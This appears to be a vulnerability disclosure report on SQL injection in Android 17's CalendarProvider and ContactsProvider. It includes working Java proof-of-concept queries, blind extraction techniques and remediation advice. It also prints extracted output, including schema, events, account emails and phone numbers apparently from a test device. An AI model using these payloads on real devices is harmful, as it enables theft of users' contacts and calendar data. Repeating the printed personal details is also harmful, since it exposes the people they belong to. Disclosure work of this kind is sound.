# VRP Report #26: Projection & Selection SQL Injection in CalendarProvider and ContactsProvider

## Summary

CalendarProvider allows arbitrary SQL subqueries in the **projection** (column list) parameter, enabling **direct extraction** of the entire calendar database contents in single queries — no blind technique needed. ContactsProvider allows SQL injection in the **selection** (WHERE clause) parameter, enabling blind boolean extraction of contacts database internals via row count analysis. Both vectors bypass intended content provider access controls on Android 17 (API 37).

## Severity: HIGH

- **Confidentiality**: Full extraction of calendar events, attendee emails, sync tokens, account data, and database internals via CalendarProvider. Full extraction of contacts, phone numbers, account names, and internal tables via ContactsProvider.
- **CVSS 3.1**: 7.5+ (Network/Local attack, Low complexity, No user interaction)

## Affected Components

| Provider | Projection Injection | Selection Injection | sortOrder Injection |
|---|---|---|---|
| CalendarProvider | **VULNERABLE** (direct extraction) | **VULNERABLE** (blind boolean) | **VULNERABLE** (sortOrder accepted) |
| ContactsProvider | PROTECTED ("Non-token detected") | **VULNERABLE** (blind boolean) | **VULNERABLE** (sortOrder accepted) |
| SettingsProvider | PROTECTED ("Invalid column") | PROTECTED (error) | VULNERABLE (accepted but no blind signal via CASE WHEN) |
| MediaProvider | N/A | N/A | PROTECTED ("Invalid token SELECT") |
| DownloadProvider | N/A | N/A | PROTECTED ("Invalid token SELECT") |

## Root Cause

1. **CalendarProvider**: `SQLiteQueryBuilder` does not validate projection columns against SQL injection. Arbitrary subqueries in projection are passed directly to SQLite and executed.
2. **ContactsProvider**: `ENFORCE_STRICT_QUERY_BUILDER` (change ID 143231523) is **globally disabled** on Android 17 Build CP2A.260605.012. The selection parameter is not sanitized against subqueries.
3. **Previous Report #25 Correction**: The sortOrder-based blind boolean technique (`CASE WHEN condition THEN _id ELSE _id END ASC`) was **non-functional** for value extraction — both branches produce identical sort order, so blindBool always returned true. The corrected approach uses **selection injection with row count analysis** (count > 0 = true, count = 0 = false).

## Proof of Concept

### Device
- Pixel 6a, Android 17, Build CP2A.260605.012
- PoC app: `com.vrp.poc` with READ_CALENDAR, READ_CONTACTS

### Vector 1: CalendarProvider Projection Injection (DIRECT EXTRACTION)

```java
// Single query extracts any data from the calendar database
Cursor c = getContentResolver().query(
    Uri.parse("content://com.android.calendar/events"),
    new String[]{"(SELECT name FROM sqlite_master LIMIT 1) AS x"},
    null, null, null);
// Returns: "android_metadata" — first table name, directly
```

### Vector 2: ContactsProvider Selection Injection (BLIND BOOLEAN)

```java
// Row count gives clear true/false signal
Cursor c = getContentResolver().query(
    Uri.parse("content://com.android.contacts/contacts"),
    new String[]{"_id"},
    "1=1 AND (SELECT unicode(substr((SELECT account_name FROM accounts LIMIT 1),1,1)))>=115",
    null, null);
// c.getCount() > 0 means condition is true; == 0 means false
// Binary search on character values extracts arbitrary data
```

## Dynamically Proven Extractions

### CalendarProvider — Direct Extraction Results

**Full database schema** (15 tables): Attendees, CalendarAlerts, CalendarCache, CalendarMetaData, Calendars, Colors, Events, EventsRawTimes, ExtendedProperties, Instances, Reminders, _sync_state, _sync_state_metadata, android_metadata, sqlite_sequence

**Calendar accounts** (4 calendars):
```
[CALENDAR] Holidays in India — account: sandiyotest@gmail.com (com.google)
[CALENDAR] Google-BB — owner: classroom111771798454834833104@group.calendar.google.com
[CALENDAR] sandiyotest@gmail.com — personal calendar
```

**Event data** (196 events): Full titles, descriptions, locations, organizers, timestamps
```
[EVENT] 'Onam' — organizer: en.indian#holiday@group.v.calendar.google.com, date: 2027-09-12
[EVENT] 'Ganesh Chaturthi' — date: 2027-09-04
[EVENT] 'Janmashtami' — Public holiday, date: 2027-08-25
```

**Sync state with auth tokens** (513 bytes JSON):
```json
{
    "version": 16,
    "package": "com.google.android.calendar",
    "sandiyotest@gmail.com": {},
    "en-gb.indian#holiday@group.v.calendar.google.com": {
        "window_end": 1822176000000,
        "feed_updated_time": "2026-08-21T08:38:24.703Z",
        "last_sync_time": 1788550537668,
        "do_incremental_sync": true
    }
}
```

**Database metadata**:
- Path: `/data/data/com.android.providers.calendar/databases/calendar.db`
- SQLite version: 3.50.6
- Source ID: 2025-09-22 18:50:24
- ENABLE_LOAD_EXTENSION: disabled (properly hardened)

**5 internal triggers** (SQL extracted, showing cascade delete logic):
```sql
CREATE TRIGGER calendar_cleanup DELETE ON Calendars BEGIN DELETE FROM Events WHERE calendar_id=old._id; END
CREATE TRIGGER events_cleanup_delete DELETE ON Events BEGIN DELETE FROM Instances WHERE event_id=old._id; ... END
```

### ContactsProvider — Selection Blind Extraction Results

**35 tables in contacts2.db**: _sync_state, accounts, agg_exceptions, agg_presence, contacts, data, data_usage_stat, default_directory, deleted_contacts, directories, groups, mimetypes, name_lookup, packages, phone_lookup, photo_files, pre_authorized_uris, presence, properties, raw_contacts, search_index (FTS), sqlite_sequence, sqlite_stat1, status_updates, stream_items, stream_item_photos, v1_settings, visible_contacts

**Internal accounts** (not exposed via normal content URI):
```
[ACCT] sandiyotest@gmail.com (com.google)
[ACCT] attacker@evil.com (com.google)
```

**Phone numbers** (via data table):
```
[PHONE] 63854 36230
[PHONE] 89860 87809
```

**Contact names**: san, test

**Groups**: My Contacts, Starred in Android, Friends, Family, Coworkers

**Contact directories** (4 entries):
```
[DIR] pkg=com.google.android.contacts acct=sandiyotest@gmail.com auth=com.google.android.contacts.othercontacts
[DIR] pkg=com.google.android.contacts acct=Carrier service numbers auth=com.google.android.contacts.sdn.provider
```

**Database path**: `/data/data/com.android.providers.contacts/databases/contacts2.db`

**16 MIME types**: email_v2, im, nickname, organization, phone_v2, sip_address, name, postal-address_v2, identity, photo, group_membership, note, contact_event, website, relation, contact_misc

## Blind Technique Comparison (Proven)

| Technique | ContactsProvider | CalendarProvider | Notes |
|---|---|---|---|
| sortOrder CASE WHEN (same col) | BROKEN (true=true, false=true) | BROKEN | Both branches identical |
| sortOrder div-by-zero | BROKEN | BROKEN | SQLite handles gracefully |
| sortOrder abs(MIN_INT64) overflow | **WORKS** (true=true, false=false) | N/A | Integer overflow crashes query |
| sortOrder huge zeroblob | **WORKS** (true=true, false=false) | N/A | OOM crashes query |
| Selection row count | **WORKS** (3 vs 0) | **WORKS** (196 vs 0) | Most reliable |
| Projection subquery | BLOCKED ("Non-token") | **WORKS** (direct extraction) | Best for CalendarProvider |

## Impact Chain

1. **Malicious app with READ_CALENDAR** → Complete calendar database extraction including:
   - All events, attendees, descriptions, locations
   - Other people's email addresses from shared events
   - Google Calendar sync tokens and state
   - Internal database schema and metadata

2. **Malicious app with READ_CONTACTS** → Complete contacts database extraction including:
   - Internal accounts table (not normally exposed)
   - All phone numbers, names, emails from raw data table
   - Contact group memberships
   - Directory configurations
   - Database file paths

3. **Combined**: A single app with READ_CALENDAR and READ_CONTACTS can extract the user's entire social graph — contacts, phone numbers, calendar events, meeting attendees, location history from events, and sync state metadata.

## Correction to Report #25

Report #25 claimed sortOrder blind boolean extraction via `CASE WHEN condition THEN _id ELSE _id END`. This technique is **non-functional** for value extraction because both branches produce identical sort order (`_id ASC`). The `blindBool` function returns true regardless of the condition (cursor is always non-null). The values reported in Report #25's extraction phases may have been incorrect (all characters converging to ASCII 126 `~`).

The correct techniques proven in this report are:
1. **Selection injection with row count** — reliable blind boolean
2. **Projection injection on CalendarProvider** — direct extraction, no blind needed
3. **sortOrder with overflow/OOM error** — alternative blind boolean via query failure

## Remediation

1. **CalendarProvider**: Validate projection columns against allowlisted column names. Reject subqueries in projection.
2. **ContactsProvider**: Enable `ENFORCE_STRICT_QUERY_BUILDER` (change ID 143231523) to validate selection and sortOrder parameters.
3. **All providers**: Use `SQLiteQueryBuilder.setStrict(true)` and `setStrictColumns(true)` to block SQL injection in all query parameters.

## Evidence Files

- `poc_app/src/com/vrp/poc/CalendarDirectExtractActivity.java` — CalendarProvider projection injection PoC
- `poc_app/src/com/vrp/poc/ErrorBlindExtractActivity.java` — Technique comparison + ContactsProvider selection extraction
- `poc_app/src/com/vrp/poc/FullProofExtractActivity.java` — Full proof extraction (both providers)
- `dynamic_evidence/calendar_projection_injection_evidence.log` — CalendarProvider extraction log
- `dynamic_evidence/blind_technique_comparison_evidence.log` — Technique comparison evidence
- `dynamic_evidence/full_proof_extraction_evidence.log` — Full extraction evidence

## Test Device

- Pixel 6a (bluejay), Android 17, API 37
- Build: CP2A.260605.012
- ADB ID: 26131JEGR04733
- SQLite: 3.50.6
